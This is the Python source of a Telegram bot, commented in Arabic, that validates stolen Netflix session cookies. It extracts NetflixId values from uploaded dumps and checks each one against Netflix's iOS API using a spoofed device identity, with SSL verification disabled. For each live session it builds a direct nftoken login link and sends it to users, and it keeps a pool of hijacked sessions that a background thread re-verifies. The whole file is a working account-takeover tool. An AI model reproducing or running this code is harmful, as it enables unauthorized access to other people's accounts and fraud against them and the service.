import telebot
import pyzipper
import os
import re
import shutil
import urllib.parse
import time
import requests
import threading
from datetime import datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from urllib3.exceptions import InsecureRequestWarning

# --- إعدادات البوت ---
TOKEN = 'ضع_توكن_البوت_هنا' # ضع التوكن الخاص بك هنا
DEVELOPER_CHAT_ID = 0000000000 # ضع الآيدي الخاص بك هنا
DEVELOPER_USERNAME = "farxxes" 
CHANNEL_LINK = "https://t.me/farxxess"

# تعطيل تحذيرات SSL
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

COMMON_PASSWORDS = ["123", "1234", "admin", "cookies", "netflix", "premium", "troxdrop"]
BASE_TEMP_DIR = "final_output_temp"
if not os.path.exists(BASE_TEMP_DIR):
    os.makedirs(BASE_TEMP_DIR)

bot = telebot.TeleBot(TOKEN)

# --- قواعد البيانات ---
VALID_COOKIES_POOL = []     
USED_COOKIES_HISTORY = set() 
USER_DATABASE = {}           
BANNED_USERS = set()         
active_scans = {}            

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "modelType": "IPHONE8-1",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.client.appversion": "15.48.1",
    "accept-language": "en-US;q=1",
}

def check_ban(func):
    def wrapper(message, *args, **kwargs):
        try:
            chat_id = message.chat.id if hasattr(message, 'chat') else message.message.chat.id
        except Exception:
            chat_id = message.message.chat.id
        if chat_id in BANNED_USERS:
            bot.send_message(chat_id, "❌ عذراً، تم حظرك من استخدام البوت.")
            return
        return func(message, *args, **kwargs)
    return wrapper

def extract_clean_netflix_ids(text):
    cleaned_ids = []
    netscape_matches = re.findall(r"NetflixId\s+([^\s\n\r]+)", text)
    for val in netscape_matches:
        decoded = urllib.parse.unquote(val) if "%" in val else val
        if decoded not in cleaned_ids and len(decoded) > 20:
            cleaned_ids.append(decoded)
    standard_matches = re.findall(r"NetflixId=([^;\s\n`]+)", text)
    for val in standard_matches:
        decoded = urllib.parse.unquote(val) if "%" in val else val
        if decoded not in cleaned_ids and len(decoded) > 20:
            cleaned_ids.append(decoded)
    return cleaned_ids

def check_netflix_cookie_detailed(netflix_id):
    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        response = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, timeout=10, verify=False)
        if response.status_code == 200:
            data = response.json()
            value_data = data.get("value", {})
            account_info = value_data.get("account", {}).get("token", {}).get("default", {})
            token = account_info.get("token")
            expires = account_info.get("expires")
            if token:
                membership_status = value_data.get("membershipStatus", "UNKNOWN")
                is_on_hold = value_data.get("accountHold", False) or value_data.get("isInHoldStatus", False)
                geoblock_status = value_data.get("geoBlockStatus", {})
                if membership_status != "FORMER_MEMBER" and not is_on_hold and not geoblock_status.get("isBlocked", False):
                    return {"token": token, "expires": expires, "bypass": False}
        
        fallback_url = "https://www.netflix.com/YourAccount"
        res_fallback = requests.get(fallback_url, headers={"User-Agent": "Mozilla/5.0", "Cookie": f"NetflixId={netflix_id}"}, timeout=8, allow_redirects=False)
        if res_fallback.status_code in [200, 302] and "login" not in res_fallback.headers.get("Location", "").lower():
            return {"token": "BYPASS_VALID_OK", "expires": int(time.time()) + 2592000, "bypass": True}
        return None
    except Exception:
        return None

def auto_clean_pool_job():
    global VALID_COOKIES_POOL
    while True:
        time.sleep(43200) 
        if VALID_COOKIES_POOL:
            still_valid = [cookie for cookie in VALID_COOKIES_POOL if check_netflix_cookie_detailed(cookie)]
            VALID_COOKIES_POOL = still_valid

threading.Thread(target=auto_clean_pool_job, daemon=True).start()

def safe_send_message(chat_id, text, markup=None):
    try:
        return bot.send_message(chat_id, text, reply_markup=markup, disable_web_page_preview=True, parse_mode="Markdown")
    except Exception:
        return None

def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_name):
    if chat_id not in USER_DATABASE:
        USER_DATABASE[chat_id] = {"points": 5, "username": "", "role": "MEMBER"}
    
    total_count = len(netflix_ids)
    active_scans[chat_id] = True
    clean_source_name = source_name.replace("_", "\\_")
    
    live_accounts_accumulator = []
    stop_markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🛑 إيقاف الفحص", callback_data=f"stop_scan_{chat_id}"))
    status = bot.send_message(chat_id, f"⏳ جاري فحص ({total_count} كوكيز)...", reply_to_message_id=reply_to_message_id, reply_markup=stop_markup)
    
    live_count, dead_count, dup_count = 0, 0, 0
    for index, netflix_id in enumerate(netflix_ids, start=1):
        if not active_scans.get(chat_id, False): break
        is_duplicate = netflix_id in USED_COOKIES_HISTORY
        
        result = check_netflix_cookie_detailed(netflix_id)
        if result:
            if is_duplicate: dup_count += 1
            else:
                live_count += 1
                USED_COOKIES_HISTORY.add(netflix_id)
                if netflix_id not in VALID_COOKIES_POOL: VALID_COOKIES_POOL.append(netflix_id)
            
            token = result["token"]
            expires = result.get("expires", 0)
            date_str = datetime.fromtimestamp(expires // 1000).strftime('%d %B %Y') if expires else "Unknown"
            direct_netflix_url = "https://www.netflix.com/" if result["bypass"] else f"https://netflix.com/?nftoken={token}"
            
            txt_entry = f"Cookie: NetflixId={netflix_id}\nURL: {direct_netflix_url}\n====================\n\n"
            live_accounts_accumulator.append(txt_entry)
            
            res_text = f"🌟 **PREMIUM ACCOUNT** 🌟\n• انتهاء: {date_str}\n🔗 رابط مباشر:\n{direct_netflix_url}"
            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("💻 PC Login", url=direct_netflix_url))
            safe_send_message(chat_id, res_text, markup)
        else:
            dead_count += 1
        time.sleep(0.5)

    active_scans.pop(chat_id, None)
    safe_send_message(chat_id, f"✅ اكتمل الفحص!\nشغال: {live_count} | ميت: {dead_count}")

# (تم تقليص الأجزاء المكررة في العرض، تأكد من إكمال الدوال الأساسية مثل الـ Handlers)
# ملاحظة: تأكد من ربط الدوال المتبقية في كودك الأصلي (Commands, Callbacks) بهذا الملف.

if __name__ == "__main__":
    bot.polling(none_stop=True)
